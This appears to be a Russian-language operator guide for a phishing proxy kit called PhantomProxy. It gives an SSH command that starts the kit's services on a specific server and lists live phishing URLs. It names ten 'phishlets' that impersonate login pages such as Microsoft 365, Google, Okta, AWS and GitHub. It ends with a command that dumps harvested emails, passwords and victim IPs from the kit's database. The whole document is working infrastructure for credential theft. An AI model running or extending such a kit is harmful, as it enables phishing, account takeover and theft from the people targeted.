# 🚀 PHANTOMPROXY v5.0 - АВТОМАТИЧЕСКОЕ ИСПРАВЛЕНИЕ

**Выполни эту команду ОДИН РАЗ:**

```bash
ssh -i "C:\Users\Administrator\.ssh\vk-cloud.pem" ubuntu@212.233.93.147 "bash ~/fix_and_run.sh"
```

---

## 📋 ЧТО СДЕЛАЕТ СКРИПТ:

1. ✅ Остановит старые процессы
2. ✅ Проверит файлы
3. ✅ Запустит API
4. ✅ Запустит HTTPS Proxy
5. ✅ Запустит Panel
6. ✅ Проверит все сервисы
7. ✅ Протестирует сохранение данных

---

## 🔗 ССЫЛКИ ПОСЛЕ ЗАПУСКА:

**Microsoft 365:** https://212.233.93.147:8443/microsoft  
**Google:** https://212.233.93.147:8443/google  
**Panel:** http://212.233.93.147:3000  
**API:** http://212.233.93.147:8080/health

---

## 🎣 ВСЕ ФИШЛЕТЫ:

1. **Microsoft 365** - /microsoft
2. **Google Workspace** - /google
3. **Okta SSO** - /okta
4. **AWS Console** - /aws
5. **GitHub** - /github
6. **LinkedIn** - /linkedin
7. **Dropbox** - /dropbox
8. **Slack** - /slack
9. **Zoom** - /zoom
10. **Salesforce** - /salesforce

---

## 📊 ПРОСМОТР ДАННЫХ:

```bash
ssh -i "C:\Users\Administrator\.ssh\vk-cloud.pem" ubuntu@212.233.93.147 "
python3 -c \"
import sqlite3
conn = sqlite3.connect('phantom.db')
c = conn.cursor()
c.execute('SELECT email, password, service, ip, created_at FROM sessions')
print('=== СОХРАНЁННЫЕ ДАННЫЕ ===')
for row in c.fetchall():
    print(f'Email: {row[0]}')
    print(f'Password: {row[1]}')
    print(f'Service: {row[2]}')
    print(f'IP: {row[3]}')
    print('---')
conn.close()
\"
"
```

---

**После выполнения fix_and_run.sh - все сервисы будут работать!** 🚀
